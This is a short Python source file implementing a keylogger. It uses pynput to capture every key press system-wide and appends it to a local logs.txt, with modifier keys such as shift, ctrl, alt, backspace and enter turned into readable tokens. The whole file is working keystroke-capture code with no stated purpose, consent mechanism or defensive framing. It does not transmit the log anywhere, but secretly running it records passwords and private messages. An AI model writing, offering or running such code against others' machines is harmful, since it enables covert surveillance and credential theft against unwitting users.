from pynput.keyboard import Listener

key_information = 'logs.txt'

def write_to_file(key):
    log = str(key)
    log = log.replace("'", '')
    if log == 'Key.space':
        log = ' '
    if log == 'Key.tab':
        log = '    '
    if log == 'Key.backspace':
        log = '[ BACKSPACE ]'
    if log == 'Key.caps_lock':
        log = '[ CAPS LOCK ]'
    if log == 'Key.shift':
        log = '[ LEFT SHIFT ]'
    if log == 'Key.ctrl_l':
        log = '[ LEFT CTRL ]'
    if log == 'Key.ctrl_r':
        log = '[ RIGHT CTRL ]'
    if log == 'Key.shift_r':
        log = '[ RIGHT SHIFT ]'
    if log == 'Key.alt_l':
        log = '[ LEFT ALT ]'
    if log == 'Key.alt_gr':
        log = '[ RIGHT ALT ]'
    if log == 'Key.enter':
        log = '\n'

    with open(key_information, 'a') as f:
        f.write(log)

with Listener(on_press= write_to_file) as listener:
    listener.join()